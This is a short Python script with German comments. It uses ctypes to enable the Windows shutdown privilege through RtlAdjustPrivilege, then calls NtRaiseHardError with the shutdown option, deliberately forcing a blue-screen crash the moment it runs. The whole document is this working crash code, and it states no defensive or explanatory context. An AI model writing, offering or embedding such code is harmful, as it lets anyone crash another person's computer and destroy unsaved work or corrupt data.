import ctypes

# Konstanten für die ntdll-Funktionen
SeShutdownPrivilege = 19
STATUS_ACCESS_DENIED = 0xC0000022 # Der Fehler-Code aus dem Skript

def trigger_bsod():
    ntdll = ctypes.windll.ntdll
    
    # 1. Privileg aktivieren (Das ist der entscheidende Schritt!)
    # RtlAdjustPrivilege(Privilege, Enable, IsThread, PreviousValue)
    prev_value = ctypes.c_bool()
    res1 = ntdll.RtlAdjustPrivilege(
        SeShutdownPrivilege, 
        True, 
        False, 
        ctypes.byref(prev_value)
    )
    
    if res1 != 0:
        return

    # 2. Den harten Fehler auslösen
    # NtRaiseHardError(Status, NumParams, Mask, Params, Option, Response)
    response = ctypes.c_uint()
    
    res2 = ntdll.NtRaiseHardError(
        STATUS_ACCESS_DENIED, 
        0, 0, 0, 
        6, # Option 6 steht für 'Host Shutdown/Restart'
        ctypes.byref(response)
    )

if __name__ == "__main__":
    trigger_bsod()